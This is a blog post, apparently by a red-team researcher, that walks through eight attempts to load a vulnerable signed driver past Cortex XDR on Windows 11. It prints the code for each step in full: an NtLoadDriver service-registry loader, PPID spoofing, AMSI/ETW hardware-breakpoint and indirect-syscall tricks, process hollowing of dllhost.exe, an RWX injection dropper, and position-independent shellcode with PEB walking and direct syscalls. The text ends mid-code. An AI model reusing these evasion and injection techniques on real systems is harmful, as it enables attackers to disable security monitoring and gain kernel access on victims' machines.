---
title: "Eight rounds against Cortex XDR's driver-load coverage — process hollowing, the IAT trap, and a 2.7 KB shellcode that finally landed"
date: 2026-06-04T12:00:00-05:00
draft: false
categories: [Research, EDR Evasion]
tags: [cortex-xdr, byovd, process-hollowing, indirect-syscalls, shellcode, ntloaddriver, win11, edr-bypass]
description: "Cortex XDR ships a behavioural rule family called `sync.suspicious_driver_service_creation` that catches every textbook BYOVD loader vector on a default Windows 11 24H2. This post is the full walkthrough of eight iterations against it — what each round revealed, why six of them died, the rabbit hole of \"my PE payload runs inside dllhost but crashes before the first instruction\" (spoiler: it was never the entry point), and the 2.7 KB position-independent shellcode that finally went end-to-end while Cortex stayed silent. Code is included verbatim — shellcode, dropper, linker script, the lot."
ShowToc: true
TocOpen: false
ShowReadingTime: true
ShowCodeCopyButtons: true
---
> **TL;DR** — Cortex's `sync.suspicious_driver_service_creation.{1..4}` is a
> well-engineered behavioural rule family that covers the SCM API path, the
> PowerShell + `sc.exe` lineage, the `NtLoadDriver` syscall correlated with a
> non-trusted parent, and the static classification of binaries that "look like
> driver loaders" at `ProcessCreate`. My usermode bypasses for rounds 1–5
> (`sc.exe` → `NtLoadDriver` direct → PPID spoof → AMSI/ETW HWBP + indirect
> syscalls + ntdll unhook + PPID spoof) all died. Process hollowing of
> `dllhost.exe` via indirect syscalls passed clean — and then my PE payload
> kept crashing inside the hollowed target with `STATUS_ACCESS_VIOLATION`
> before executing a single instruction. Took me three more rounds to realise
> the problem wasn't the entry point or the IAT or the PEB struct alignment —
> it was that hand-rolled PE hollowing inherits enough subtle state from the
> host that a custom payload PE is fundamentally brittle. The fix was
> abandoning the PE and writing a 2.7 KB position-independent shellcode that
> does the whole load on its own. Cortex stayed silent across every round of
> process hollowing. Defender notes at the end — the technique is detectable,
> just not by the rules that are deployed today.

## The setup

I had two unrelated things sitting on my desk at the same time.

The first was a separate driver-research project. The driver is signed,
has a known CVE upstream, is patched in the vendor's latest version, and
the patched Authentihash is **not** on the Microsoft HVCI block list as of
the May 2026 build. That makes it a perfect BYOVD subject — old enough to
be loadable on a default Windows 11 24H2 with HVCI on, recent enough that
public threat-intel hasn't blocklisted the specific binary I picked. I'm
reporting that driver's findings through PSIRT and MSRC separately, so
this post intentionally **doesn't name it**. Treat "the driver" throughout
as a placeholder for any signed vulnerable driver you'd reach for in a
2026 engagement.

The second was: I wanted to drop and load it on a box running Cortex XDR.
Not for production red-team use — for research. Specifically, I wanted to
see how Cortex's behavioural driver-load coverage held up against a few
standard loader shapes, and to validate the operator-kit primitives I have
been building (AMSI/ETW hardware-breakpoint bypass, indirect syscalls,
process hollowing).

Lab: clean Windows 11 Pro 24H2 build **26200**, HVCI enabled by default,
Cortex XDR agent connected to a sandbox tenant. The classifier on the
endpoint is the production one; rules are the deployed defaults at the
time of writing.

This is the eight-round walkthrough. I'm going to be specific about what
killed each attempt because that's where the value is — Cortex's coverage
matrix is not obvious and the rules' names show up in the prevention
alerts.

## Round 1 — `sc.exe` from PowerShell

The most textbook flow there is:

```powershell
sc.exe create MyDrv type= kernel binPath= C:\Tools\mydrv.sys
sc.exe start  MyDrv
```

Predictable result. The Cortex prevention dialog:

```
Componente: Análisis dinámico
Código de Cortex XDR: c0400067
Descripción de la prevención: Comportamiento malicioso detectado
Información adicional 1: Rule sync.suspicious_driver_service_creation.1
```

Killed during `sc create` / `sc start`. Whole PowerShell process terminated.
The rule `.1` clearly watches the SCM API path correlated with a
non-trusted parent process (in this case `powershell.exe`). What it
*doesn't* watch is the file copy — the driver `.sys` sat on disk happily.
That tells me the binary's SHA-256 isn't in Cortex's threat intel yet.
Good signal.

## Round 2 — `NtLoadDriver` direct, bypassing the SCM

The SCM path is one of three legitimate ways to load a kernel driver. The
other is `NtLoadDriver`, which is what the SCM itself calls internally. If
we go straight to `NtLoadDriver`, we don't touch `sc.exe` and we don't open
the Service Control Manager — but we do need to write the driver's service
registry key by hand first.

The minimal loader, in C:

```c
#include <windows.h>
#include <stdio.h>

#define SVC_REG_PATH L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MyDrv"

typedef LONG NTSTATUS;
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef VOID    (NTAPI *RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI *NtLoadDriver_t)(PUNICODE_STRING);

static int enable_priv(LPCWSTR p) {
    HANDLE t;
    OpenProcessToken(GetCurrentProcess(),
                     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t);
    LUID l; LookupPrivilegeValueW(NULL, p, &l);
    TOKEN_PRIVILEGES tp = { 1, { { l, SE_PRIVILEGE_ENABLED } } };
    AdjustTokenPrivileges(t, FALSE, &tp, sizeof tp, NULL, NULL);
    return GetLastError();
}

static int write_svc_reg(const wchar_t *abs_path) {
    HKEY k;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\MyDrv",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &k, NULL);

    wchar_t ip[512];
    swprintf_s(ip, 512, L"\\??\\%ls", abs_path);
    DWORD ty=1, st=3, ec=1;
    RegSetValueExW(k, L"ImagePath", 0, REG_EXPAND_SZ,
        (BYTE*)ip, (DWORD)((wcslen(ip)+1)*sizeof(wchar_t)));
    RegSetValueExW(k, L"Type",         0, REG_DWORD, (BYTE*)&ty, sizeof ty);
    RegSetValueExW(k, L"Start",        0, REG_DWORD, (BYTE*)&st, sizeof st);
    RegSetValueExW(k, L"ErrorControl", 0, REG_DWORD, (BYTE*)&ec, sizeof ec);
    RegCloseKey(k);
    return 0;
}

int wmain(int argc, wchar_t **argv) {
    enable_priv(L"SeLoadDriverPrivilege");
    write_svc_reg(argv[2]);

    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    RtlInitUnicodeString_t pRtlInit = (RtlInitUnicodeString_t)
        GetProcAddress(nt, "RtlInitUnicodeString");
    NtLoadDriver_t pLoad = (NtLoadDriver_t)
        GetProcAddress(nt, "NtLoadDriver");

    UNICODE_STRING us;
    pRtlInit(&us, SVC_REG_PATH);
    NTSTATUS st = pLoad(&us);
    printf("NtLoadDriver -> 0x%08lx\n", st);
    return st < 0 ? 1 : 0;
}
```

Compile and run from PowerShell:

```
Rule sync.suspicious_driver_service_creation.4
```

Different variant of the same rule family. Stage killed before the
`NtLoadDriver` syscall even fires. So Cortex is using ETW telemetry at
`ProcessCreate` — or correlating the parent (`pwsh`) with what the child is
about to do via kernel callbacks. Either way, fresh process spawned from
PowerShell that's going to call `NtLoadDriver` triggers `.4`.

The loader binary itself wasn't on the hash-block list (it ran briefly
before the kill). So this isn't AV — it's behavioural classification on
lineage + intent.

## Round 3 — PPID spoof to break the lineage

The standard trick when an EDR rule cares about parent-process identity is
to spoof it. On x64 Windows you spawn a child with
`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` pointing at `services.exe` or
`TrustedInstaller.exe`, and the user-mode view of the lineage shows that
process as the parent rather than your actual `pwsh`.

```c
static BOOL spawn_with_ppid(const wchar_t *exe, wchar_t *cmd,
                            const wchar_t *parent_name) {
    DWORD ppid = find_pid_by_name(parent_name);  /* toolhelp32 walk */
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    LPPROC_THREAD_ATTRIBUTE_LIST attrs = HeapAlloc(GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(attrs, 1, 0, &attrSize);
    UpdateProcThreadAttribute(attrs, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof hParent, NULL, NULL);

    STARTUPINFOEXW si = { 0 };
    si.StartupInfo.cb = sizeof si;
    si.lpAttributeList = attrs;
    PROCESS_INFORMATION pi = { 0 };

    BOOL ok = CreateProcessW(exe, cmd, NULL, NULL, FALSE,
                             EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                             NULL, NULL,
                             (LPSTARTUPINFOW)&si, &pi);
    return ok;
}
```

The loader detects on entry that its real PPID is `pwsh`, re-spawns itself
with `services.exe` as parent, exits. The second instance — with the
spoofed parent — does the registry write + `NtLoadDriver` call.

```
Rule sync.suspicious_driver_service_creation.4
```

Same rule. Cortex's kernel callbacks see the **real** creating PID
independent of the user-mode parent spoof. The
`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` attribute is enforced by the
`PspCreateProcess` kernel code, and the kernel-side callback registered by
`cyverak.sys` sees the actual creator's PID, not the spoofed one. So this
is a *good* trick against rules built on userland ETW alone, and a
*useless* trick against any rule with kernel-callback ingest.

## Round 4 — full bypass kit + indirect syscalls

I have an in-house bypass kit with the kind of primitives that work
against Cortex's userland telemetry consumers:

- Hardware-breakpoint AMSI bypass (`Dr0` → `amsi!AmsiScanBuffer`, VEH
  rewrites the result pointer to `AMSI_RESULT_CLEAN`)
- Hardware-breakpoint ETW silence (`Dr1` → `ntdll!EtwEventWrite`)
- TartarusGate indirect syscalls (SSN recovered at runtime by walking
  ntdll's exports, `syscall` instruction jumped to inside ntdll so the
  call stack shows ntdll as origin)
- Selective `ntdll` unhook (refresh per-function from
  `\KnownDlls\ntdll.dll`)

I layered all of that on top of round 3's PPID-spoofed loader:

```c
bp_init(BP_ETW_PATCH | BP_INDIRECT_SYSCALLS | BP_NTDLL_UNHOOK_SELECTIVE);
sc_resolve(bp_fnv1a("NtLoadDriver"), &entry);
sc_dispatch(&entry, (DWORD64)&us, 0,0,0,0,0,0,0);
```

The indirect syscall mechanism is the interesting one. The TartarusGate
trampoline (x64 intel syntax) is:

```asm
sc_trampoline:
    mov     r11, rcx                 ; save syscall_addr
    mov     eax, edx                 ; SSN -> eax
    mov     rcx, r8                  ; shift args left
    mov     rdx, r9
    mov     r8,  [rsp+0x28]
    mov     r9,  [rsp+0x30]
    mov     r10, [rsp+0x38]
    mov     [rsp+0x28], r10
    ; ... shift remaining stack args ...
    mov     r10, rcx                 ; Windows syscall conv requires r10
    jmp     r11                      ; jump into ntdll at a real `syscall`
```

The `jmp r11` lands inside `ntdll.dll`'s `.text`, on a `syscall; ret`
instruction we found earlier. Cortex's call-stack ETW provider sees the
syscall originating from `ntdll!Nt*`, not from our binary, even though the
SSN was sourced and dispatched from us.

```
Rule sync.suspicious_driver_service_creation.4
```

Same rule. And here the diagnosis got interesting — the kill timing said
**Cortex was killing our loader at `ProcessCreate`, before our code
executed a single instruction**. The indirect syscalls never ran. The ETW
HWBP never installed. None of that matters when the rule classifies your
binary as a driver loader at process create time, based on static PE
features — `advapi32` imports + the literal string
`\Registry\Machine\System\...` in your `.rdata` + the imported
`RegSetValueExW` slot — and decides to kill on sight.

That's a level of behavioural coverage I wasn't expecting at PCe time.
It's not strictly threat intel (the SHA-256 wasn't on the block list, the
binary ran briefly), it's not strictly behavioural execution monitoring
(we never got to execute), it's *predictive classification at process
create*. Nice.

## Round 5 — pivot: process hollowing of `dllhost.exe`

If the rule is on the binary's features and lineage, the answer is to
make sure the **caller of `NtLoadDriver` is a Microsoft-signed binary
that Cortex doesn't classify as a driver loader at process create**.

`dllhost.exe` is signed by Microsoft, lives in `C:\Windows\System32`, runs
constantly, and is exactly the kind of process you'd want to live inside.
Process hollowing is the standard technique: spawn `dllhost` suspended,
unmap its image, write your payload at its preferred image base, patch
the PEB, set the thread context's entry pointer, resume.

The whole hollow has to be done via **indirect syscalls** so the
`Nt(Un)MapViewOfSection` / `NtWriteVirtualMemory` / `NtSetContextThread`
chain doesn't trip any userland telemetry consumer.

```c
int bp_hollow_and_run(const char *target_exe,
                       const void *payload, size_t payload_len,
                       const wchar_t *payload_cmdline,
                       DWORD wait_ms,
                       DWORD *out_pid) {
    /* 1. CreateProcess(target, CREATE_SUSPENDED) */
    CreateProcessA(target_exe, target_cmd, NULL, NULL, FALSE,
                   CREATE_SUSPENDED | CREATE_NO_WINDOW,
                   NULL, NULL, &si, &pi);

    /* 2. Resolve target PEB.ImageBase */
    pNtQueryInformationProcess(hProc, 0, &pbi, sizeof pbi, NULL);

    /* 3. Unmap the original PE */
    pNtUnmapViewOfSection(hProc, pbi.PebBaseAddress->ImageBaseAddress);

    /* 4. Allocate payload's preferred ImageBase */
    remote_base = VirtualAllocEx(hProc, payload_pref_base, payload_image_sz,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    /* 5. Layout payload headers + sections into local_image,
     *    apply relocations if delta != 0 */
    memcpy(local_image, payload, payload_hdr_sz);
    for each section: memcpy(local_image + sec[i].VirtualAddress, ...);
    apply_relocations(local_image, local_nt, delta);

    /* 6. NtWriteVirtualMemory full image */
    pNtWriteVirtualMemory(hProc, remote_base, local_image,
                          payload_image_sz, &wr);

    /* 7. Per-section page protections (no blanket RWX) */
    for each section: VirtualProtectEx(hProc, remote_base + va, size, prot);

    /* 8. Patch PEB.ImageBaseAddress and ProcessParameters.CommandLine */
    pNtWriteVirtualMemory(hProc, &peb->ImageBaseAddress,
                          &remote_base, sizeof PVOID, &wr);

    /* 9. SetThreadContext: Rcx = entry */
    GetThreadContext(hThread, &ctx);
    ctx.Rcx = (DWORD64)remote_base + payload_entry_rva;
    SetThreadContext(hThread, &ctx);

    /* 10. Resume */
    ResumeThread(hThread);
}
```

Built a custom PE payload that does the registry write + `NtLoadDriver`
from inside the hollowed `dllhost`, embedded the payload bytes inside the
dropper's `.rdata`, ran it:

```
[hollow] CreateProcess SUSPENDED target=C:\Windows\System32\dllhost.exe
[hollow]   target PID = 28692
[hollow] NtUnmapViewOfSection(target_image)
[hollow] VirtualAllocEx at preferred base 0000000140000000 (size 77824)
[hollow] NtWriteVirtualMemory full image (77824 bytes)
[hollow] Patching target PEB
[hollow] SetThreadContext entry=0000000140002ea0
[hollow] ResumeThread
[hollow] [+] hollowed and resumed
[hollow]   target exit code = 3221225477   ← 0xC0000005, STATUS_ACCESS_VIOLATION
```

**No Cortex alert.** None. The hollow ran clean, the payload was written,
the thread resumed. Then the payload crashed with an AV inside dllhost
before producing any output. The technique against Cortex worked — Cortex
did not detect `CreateProcess(dllhost, SUSPENDED)` + `NtUnmapViewOfSection`
from a hollow chain done via indirect syscalls — but the loader part of
my chain was broken.

## Round 6 — the rabbit hole that ate three days

The AV happens before the payload's `wmain` writes its first marker file.
I assumed: IAT not resolved. The OS loader normally walks
`IMAGE_DIRECTORY_ENTRY_IMPORT` of the booting PE, calls `LoadLibraryA`
and `GetProcAddress` for each entry, and patches the payload's IAT slots.
In process hollowing, no OS loader runs for the payload — its IAT is full
of RVAs from the file, not resolved virtual addresses.

So I wrote a manual IAT resolver as a custom entry stub. Compiled with
`-nostartfiles -Wl,-e_entry_stub`. The stub does PEB walking to find
kernel32, exports walking to find `LoadLibraryA` and `GetProcAddress`,
iterates the payload's import descriptor, and patches each `FirstThunk`
slot. Then it parses the command line from `PEB.ProcessParameters` and
calls the real `wmain`.

```c
typedef struct _PEB_MIN {
    BYTE Reserved1[2];      // 0x00
    BYTE BeingDebugged;     // 0x02
    BYTE Reserved2[1];      // 0x03
    PVOID ImageBaseAddress; // C puts this at +0x08 with padding   ← BUG
    PEB_LDR *Ldr;           // C puts this at +0x10                ← BUG
} PEB_MIN;
```

Same AV. So I debugged the struct alignment — the real offsets on x64 are
`ImageBaseAddress` at `+0x10` and `Ldr` at `+0x18`, and I had them at
`+0x08` and `+0x10` because C-pad rules align `PVOID` after the four
trailing bytes to `+0x08`. Fixed it with explicit padding:

```c
typedef struct _PEB_MIN {
    BYTE  InheritedAddressSpace;     // 0x00
    BYTE  ReadImageFileExecOptions;  // 0x01
    BYTE  BeingDebugged;             // 0x02
    BYTE  BitField;                  // 0x03
    BYTE  Padding0[4];               // 0x04 -- explicit padding
    HANDLE Mutant;                   // 0x08 -- real field, not padding
    PVOID  ImageBaseAddress;         // 0x10
    PEB_LDR *Ldr;                    // 0x18
} PEB_MIN;
```

Same AV.

I went deeper. Made the payload trivial — its entire `_entry_stub` body
became:

```c
void _entry_stub(void) {
    __asm__("int $3");      /* breakpoint -> STATUS_BREAKPOINT 0x80000003 */
}
```

If that runs, exit code is `0x80000003`. If it doesn't, exit code stays
`0xC0000005`. Result: `0xC0000005`. The entry point was never reached. My
custom entry stub plus my IAT resolver plus my PEB struct fix had all been
fixes to a non-problem. The thread crashed somewhere between
`ResumeThread` and the first instruction of my payload.

I added forensic logging to the hollow's `SetThreadContext` stage to dump
the initial `Rip`, `Rcx`, and `Rsp` of the suspended thread:

```
[hollow]   initial Rip=0x7ffd616a7bf0  Rcx=0x7ff7ce651530  Rsp=0xaa435efd58
```

`Rip` was in ntdll, inside `LdrInitializeThunk`. `Rcx` was inside the
**original** dllhost image, pointing at its entry point — the kernel uses
the convention "thread is at LdrInitializeThunk, with the eventual entry
target in Rcx for later use." The kit was setting `ctx.Rcx = our_entry`,
relying on that convention.

But `NtUnmapViewOfSection` in step 3 had already removed the original
dllhost image. Whatever LdrInitializeThunk does during its run, if it
touches the old `Rcx` value (now pointing at unmapped memory), or touches
`PEB.Ldr` entries from before the unmap, AV.

I tried setting `ctx.Rip = our_entry` to skip LdrInitializeThunk entirely.
Same AV. I tried setting both. Same AV. I added page protections, made
sure the section was RWX. Same AV.

That was the day I realised I was solving the wrong problem.

## Round 7 — abandon the PE, write raw shellcode

A PE payload after process hollowing has fundamentally a lot of state to
inherit correctly from the host process. LdrInitializeThunk wants to do
work. The OS loader assumes `PEB.Ldr` has been pre-populated by the
kernel mapping path. The payload's own startup wants the runtime
initialised. Cumulatively, these dependencies are why "manual map" and
"reflective DLL injection" loaders are 1000+ lines of code each — they
reproduce a meaningful fraction of the OS loader's behaviour to keep the
payload PE happy.

The escape hatch: **don't be a PE**. Be raw bytes. A shellcode with no
imports, no relocations, no sections, no headers. Position-independent.
Resolves everything it needs by walking the PEB. Calls everything via
typedef'd function pointers. Exits via direct `NtTerminateProcess`
syscall so there's no WerFault.

Smallest possible test: 11 bytes.

```
48 b8 ef be ad de 00 00 00 00    mov rax, 0xDEADBEEF
cc                               int 3
```

Allocate RWX in the remote, write those 11 bytes, set `Rip` to point at
the allocation, resume. If the shellcode runs, the `int 3` raises an
unhandled exception, WerFault attaches, the process eventually exits with
some status or hangs. If it doesn't run, you get the same `0xC0000005`
you've been staring at.

Dropper for that test (cut down):

```c
int main(void) {
    bp_init(BP_ETW_PATCH | BP_INDIRECT_SYSCALLS | BP_NTDLL_UNHOOK_SELECTIVE);

    STARTUPINFOA si = { .cb = sizeof si };
    PROCESS_INFORMATION pi = { 0 };
    char cmd[] = "C:\\Windows\\System32\\dllhost.exe";
    CreateProcessA(cmd, cmd, NULL, NULL, FALSE,
                   CREATE_SUSPENDED | CREATE_NO_WINDOW,
                   NULL, NULL, &si, &pi);

    static const unsigned char SC[] = {
        0x48,0xB8, 0xEF,0xBE,0xAD,0xDE, 0x00,0x00,0x00,0x00,  /* mov rax, 0xDEADBEEF */
        0xCC                                                  /* int 3 */
    };

    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, sizeof SC,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remote, SC, sizeof SC, NULL);

    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rip = (DWORD64)remote;
    ctx.Rcx = (DWORD64)remote;
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, 8000);

    DWORD ec = 0;
    GetExitCodeProcess(pi.hProcess, &ec);
    printf("exit code = 0x%08lx\n", ec);
    return 0;
}
```

Ran it:

```
exit code = 0x00000103   (STILL_ACTIVE — process hung waiting on WerFault)
```

WerFault was up. The `int 3` had raised an unhandled exception, WerFault
had attached to create a crash dump, and the WaitForSingleObject timed
out because the process wasn't done. **The shellcode ran inside dllhost.**

That's the moment the entire previous three rounds of debugging
clarified. The bypass against Cortex had been working since round 5. What
had been broken was my decision to use a PE payload format that the OS
loader needed to babysit. Raw shellcode skips all of that.

**Cortex: no alert.** Process hollowing + raw shellcode in dllhost.exe
still flew under the rules.

## Round 8 — the real payload

Now I needed shellcode that actually loads a driver. The plan:

1. Walk PEB → find kernel32 and ntdll bases
2. Resolve `LoadLibraryA` and `GetProcAddress` from kernel32 by walking
   the export directory with an FNV-1a hash of the function name (no
   plaintext strings)
3. Use `GetProcAddress` to resolve everything else from kernel32
4. `LoadLibraryA("advapi32.dll")` and resolve the privilege/registry
   functions
5. Enable `SeLoadDriverPrivilege`
6. Create `HKLM\SYSTEM\CurrentControlSet\Services\MyDrv` and write
   ImagePath / Type / Start / ErrorControl
7. Find `NtLoadDriver` in ntdll, read its SSN from the clean stub bytes
   (4-byte little-endian at offset +4 of the standard
   `mov r10, rcx; mov eax, ssn; ...` stub prologue)
8. Build the `UNICODE_STRING` for the registry path in stack
9. `syscall` directly to `NtLoadDriver`
10. Write a marker file
11. `syscall` `NtTerminateProcess(-1, 0)` for clean exit

Constraints for shellcode that survives `objcopy -O binary`:

- No imports at all (everything resolved at runtime)
- No string literals in `.rdata` that the compiler will reference with
  RIP-rel relocations (use stack arrays of bytes initialised inline)
- No globals with relocs (linker discards the `.reloc` section)
- All API call types via `__attribute__((ms_abi))` typedef'd function
  pointers

### The PEB-walk helper

x64 Windows puts the PEB pointer at `gs:[0x60]`. From there `PEB.Ldr` is a
linked list of loaded modules. We walk it, comparing `BaseDllName.Buffer`
(a wide string) against a target ASCII name, case-insensitive:

```c
typedef struct _PEB_MIN {
    uint8_t  pad0[0x18];
    PEB_LDR *Ldr;
} PEB_MIN;

static PEB_MIN *get_peb(void) {
    PEB_MIN *p;
    __asm__("mov %%gs:0x60, %0" : "=r"(p));
    return p;
}

static int wstreq_i(const uint16_t *a, const char *b) {
    while (*a && *b) {
        uint16_t ca = *a;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        uint8_t cb = *b;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == 0 && *b == 0;
}

static void *find_module(const char *basename_ascii) {
    PEB_MIN *peb = get_peb();
    if (!peb || !peb->Ldr) return 0;
    LIST_ENTRY *head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *cur  = head->Flink;
    while (cur != head) {
        LDR_ENTRY *e = (LDR_ENTRY *)((uint8_t *)cur - sizeof(LIST_ENTRY));
        if (e->BaseDllName.Buffer && wstreq_i(e->BaseDllName.Buffer, basename_ascii))
            return e->DllBase;
        cur = cur->Flink;
    }
    return 0;
}
```

### Export resolution by FNV-1a hash

We don't want function names like `"LoadLibraryA"` showing up in the
shellcode as visible strings. FNV-1a is small, fast, no table, easy to
inline:

```c
static uint32_t fnv1a(const char *s) {
    uint32_t h = 0x811C9DC5;
    while (*s) {
        h ^= (uint32_t)(uint8_t)*s++;
        h *= 0x01000193;
    }
    return h;
}

static void *find_export_by_hash(void *dll_base, uint32_t hash) {
    if (!dll_base) return 0;
    DOS_HDR *dos = (DOS_HDR *)dll_base;
    NT_HDR  *nt  = (NT_HDR *)((uint8_t *)dll_base + dos->e_lfanew);
    uint32_t exp_rva = (uint32_t)(nt->DataDirEntries[0] & 0xFFFFFFFF);
    EXP_DIR *exp = (EXP_DIR *)((uint8_t *)dll_base + exp_rva);
    uint32_t *names = (uint32_t *)((uint8_t *)dll_base + exp->AddressOfNames);
    uint16_t *ords  = (uint16_t *)((uint8_t *)dll_base + exp->AddressOfNameOrdinals);
    uint32_t *funcs = (uint32_t *)((uint8_t *)dll_base + exp->AddressOfFunctions);
    for (uint32_t i = 0; i < exp->NumberOfNames; ++i) {
        const char *n = (const char *)((uint8_t *)dll_base + names[i]);
        if (fnv1a(n) == hash)
            return (uint8_t *)dll_base + funcs[ords[i]];
    }
    return 0;
}
```

Yes, the *output* of the hash is plaintext in the shellcode. That's fine
— you'd need to know the table of hashes to figure out which functions
are being called. Standard tradeoff.

### Reading a system service number at runtime

The Windows x64 `ntdll!Nt*` stubs all start with the same canonical
prologue:

```
4C 8B D1            mov  r10, rcx
B8 ?? ?? 00 00      mov  eax, SSN
...
0F 05               syscall
C3                  ret
```

The four-byte little-endian SSN sits at offset +4 from the function's
address. If the stub is hooked (first bytes are `E9` for `jmp rel32` or
otherwise tampered), the canonical prologue check fails and we return a
sentinel. In a hollowed dllhost ntdll is not hooked (we just inherit it),
so this works:

```c
static uint32_t read_ssn(void *stub) {
    uint8_t *s = (uint8_t *)stub;
    if (!s) return 0xFFFFFFFF;
    if (s[0] == 0x4C && s[1] == 0x8B && s[2] == 0xD1 && s[3] == 0xB8)
        return *(uint32_t *)(s + 4);
    return 0xFFFFFFFF;
}
```

### The syscall trampoline

We need to dispatch a Windows syscall directly: load `eax` with the SSN,
set `r10` to `rcx` (Windows syscall convention), execute `syscall`. The
naked function form lets GCC produce the `syscall` instruction inline
with no prologue/epilogue:

```c
static __attribute__((naked))
int64_t do_syscall(uint32_t ssn, void *a1, void *a2, void *a3, void *a4) {
    __asm__(
        "mov  %rcx, %r10\n"      /* save ssn temp */
        "mov  %rdx, %rcx\n"       /* a1 -> rcx */
        "mov  %r8,  %rdx\n"       /* a2 -> rdx */
        "mov  %r9,  %r8 \n"       /* a3 -> r8  */
        "mov  0x28(%rsp), %r9\n"  /* a4 -> r9  (from shadow space) */
        "mov  %r10d, %eax\n"      /* ssn -> eax */
        "mov  %rcx,  %r10\n"      /* MS syscall conv: r10 = rcx */
        "syscall\n"
        "ret\n"
    );
}
```

### The entry point: full sequence

`sc_entry` is what the dropper points its `ctx.Rip` at. It does the whole
job and exits cleanly. Stack-allocated byte arrays for all strings (so
they end up in `.text` after the linker script consolidation, not in
`.rdata` with relocations):

```c
void __attribute__((section(".text"))) sc_entry(void) {
    /* 1) bases */
    void *k32   = find_module("kernel32.dll");
    void *ntdll = find_module("ntdll.dll");
    if (!k32 || !ntdll) goto die;

    /* 2) kernel32 essentials */
    LoadLibraryA_t   pLL = (LoadLibraryA_t)   find_export_by_hash(k32, fnv1a("LoadLibraryA"));
    GetProcAddress_t pGP = (GetProcAddress_t) find_export_by_hash(k32, fnv1a("GetProcAddress"));
    if (!pLL || !pGP) goto die;

    GetCurrentProcess_t pGCP = (GetCurrentProcess_t)pGP(k32, "GetCurrentProcess");
    CloseHandle_t       pCH  = (CloseHandle_t)      pGP(k32, "CloseHandle");
    CreateFileA_t       pCFA = (CreateFileA_t)      pGP(k32, "CreateFileA");
    WriteFile_t         pWF  = (WriteFile_t)        pGP(k32, "WriteFile");
    CreateDirectoryA_t  pCDA = (CreateDirectoryA_t) pGP(k32, "CreateDirectoryA");

    /* 3) load advapi32 + resolve */
    char advapi[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
    void *adv = pLL(advapi);
    OpenProcessToken_t      pOPT = (OpenProcessToken_t)      pGP(adv, "OpenProcessToken");
    LookupPrivilegeValueA_t pLPV = (LookupPrivilegeValueA_t) pGP(adv, "LookupPrivilegeValueA");
    AdjustTokenPrivileges_t pATP = (AdjustTokenPrivileges_t) pGP(adv, "AdjustTokenPrivileges");
    RegCreateKeyExA_t       pRCK = (RegCreateKeyExA_t)       pGP(adv, "RegCreateKeyExA");
    RegSetValueExA_t        pRSV = (RegSetValueExA_t)        pGP(adv, "RegSetValueExA");
    RegCloseKey_t           pRCl = (RegCloseKey_t)           pGP(adv, "RegCloseKey");

    /* 4) SeLoadDriverPrivilege */
    void *tok = 0;
    pOPT(pGCP(), TOKEN_ADJUST_PRIVS | TOKEN_QUERY, &tok);
    char se_load_drv[] = {'S','e','L','o','a','d','D','r','i','v','e','r',
                          'P','r','i','v','i','l','e','g','e',0};
    LUID luid = {0};
    pLPV(0, se_load_drv, &luid);
    TOKEN_PRIVS_ONE tp = { 1, luid, SE_PRIVILEGE_ENABLED };
    pATP(tok, 0, &tp, sizeof tp, 0, 0);
    pCH(tok);

    /* 5) service registry */
    char key_path[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n',
                       't','C','o','n','t','r','o','l','S','e','t','\\','S',
                       'e','r','v','i','c','e','s','\\','M','y','D','r','v',0};
    void *hKey = 0;
    pRCK(HKEY_LOCAL_MACHINE, key_path, 0, 0, REG_OPTION_NON_VOLATILE,
         KEY_ALL_ACCESS, 0, &hKey, 0);

    char img_path[] = {'\\','?','?','\\','C',':','\\','T','o','o','l','s','\\',
                       'm','y','d','r','v','.','s','y','s',0};
    char img_name[]  = {'I','m','a','g','e','P','a','t','h',0};
    pRSV(hKey, img_name, 0, REG_EXPAND_SZ, (const uint8_t *)img_path, sizeof img_path);

    uint32_t type_val = 1, start_val = 3, errctl_val = 1;
    char type_name[]  = {'T','y','p','e',0};
    char start_name[] = {'S','t','a','r','t',0};
    char ec_name[]    = {'E','r','r','o','r','C','o','n','t','r','o','l',0};
    pRSV(hKey, type_name,  0, REG_DWORD, (const uint8_t *)&type_val,   4);
    pRSV(hKey, start_name, 0, REG_DWORD, (const uint8_t *)&start_val,  4);
    pRSV(hKey, ec_name,    0, REG_DWORD, (const uint8_t *)&errctl_val, 4);
    pRCl(hKey);

    /* 6) NtLoadDriver SSN */
    void *p_NtLoadDriver = find_export_by_hash(ntdll, fnv1a("NtLoadDriver"));
    uint32_t ssn_load = read_ssn(p_NtLoadDriver);
    if (ssn_load == 0xFFFFFFFF) goto die;

    /* 7) UNICODE_STRING for "\Registry\Machine\System\CCS\Services\MyDrv" */
    static const uint16_t reg_path_w[] = {
